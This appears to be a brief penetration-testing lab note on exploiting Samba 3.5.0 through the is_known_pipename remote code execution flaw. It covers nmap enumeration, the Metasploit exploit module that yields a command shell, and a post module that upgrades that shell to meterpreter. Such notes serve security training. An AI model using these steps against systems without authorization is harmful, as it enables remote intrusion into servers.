# Exploiting Samba

* SMB is a network file sharing protocol that is used to facilitate the sharing of files and periherals between computers on a local network (LAN).
* Samba V3.5.0 is vulnerable to a remote code execution vunerability, allowing a malicious client to upload a shared library to a writable share, and then cause the server to load and execute it.

## Practice Demo

#### Enumerate the target using the db\_nmap&#x20;

* <mark style="color:yellow;">db\_nmap -sS -sV -O targetIP</mark>

<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

Use the module:

* <mark style="color:yellow;">exploit/linux/samba/is\_known\_pipename</mark>

Run the "<mark style="color:red;">check</mark>" command to know if the target is vulnerable

This module gives a command shell session on the target

#### Upgrading the command shell to a  meterpreter session

* <mark style="color:yellow;">post/multi/manage/shell\_to\_meterpreter</mark>

Set the required options
